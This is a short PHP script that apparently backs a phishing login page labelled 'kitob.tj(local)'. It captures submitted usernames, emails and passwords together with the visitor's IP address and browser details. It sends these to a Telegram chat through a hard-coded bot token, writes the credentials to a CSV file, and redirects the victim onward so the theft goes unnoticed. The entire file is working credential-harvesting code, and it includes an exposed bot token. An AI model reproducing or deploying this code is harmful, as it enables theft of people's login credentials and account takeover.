
<?php
if ($_SERVER['REMOTE_ADDR'] == '') {
  die("вход зп");
}

$ip = $_SERVER['REMOTE_ADDR'];
//echo $ip;
$about = $_SERVER['HTTP_USER_AGENT'];
$username = $_POST['username'];
$email = $_POST['email'];
$password = $_POST['password'];

$token = "6914849085:AAHo7QNpc15umgW8-ezax4YC9gwEjRkSihg";
$chat_id = "-4133161600";
$data = date(" Y-m-d H:i:s");
$site = "kitob.tj(local)";
$arr = array(
  'Username: ' => $username,
  'Password: ' => $password,
  'gmail: ' => $email,
  'IP: ' => $ip,
  'Данные о браузер и устройстве: ' => $about,
  'дата и время запроса: ' => $data, 'Запрос от сайта: ' => $site,

);

foreach ($arr as $key => $value) {
  $txt .= "<b>" . $key . "</b> " . $value . "%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}", "r");
if ($sendToTelegram) {
  header('Location: /loginpage/login.php');
 } 
/*if ($sendToTelegram) {
 header('Location: t.html');
} else {
echo "Error";
}*/

/*$blocked_ips = array(
    '126.0.0.1', 
    '127.0.0.1',
);
$visitor_ip = $_SERVER['REMOTE_ADDR'];

if (in_array($visitor_ip, $blocked_ips)) {
     header("HTTP/1.1 403 Forbidden");
    echo "Доступ к сайту запрещен.";
    exit;
}*/
?>

<?php

$filepath = 'files/logindata.csv';
$logindata = fopen($filepath, "a+");
if(!empty($logindata)){
  if ($logindata === false) {
    die('ошибка');
  }
  $arraylog = [$username.";". $email.";". $password];
  fputcsv($logindata, $arraylog);
}
fclose($logindata);

?>